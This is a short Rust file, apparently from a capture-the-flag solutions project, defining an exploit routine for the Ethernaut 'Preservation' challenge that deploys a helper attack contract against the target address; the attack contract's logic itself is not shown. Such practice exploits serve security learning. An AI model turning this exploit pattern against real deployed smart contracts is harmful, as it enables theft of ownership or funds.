use crate::abi::offshore::Offshore;
use async_trait::async_trait;
use ctf::ethernaut::lvl16_preservation::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Preservation::new(target.address, offender.clone());
        let hack_contract =
            Offshore::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;

        Ok(())
    }
}
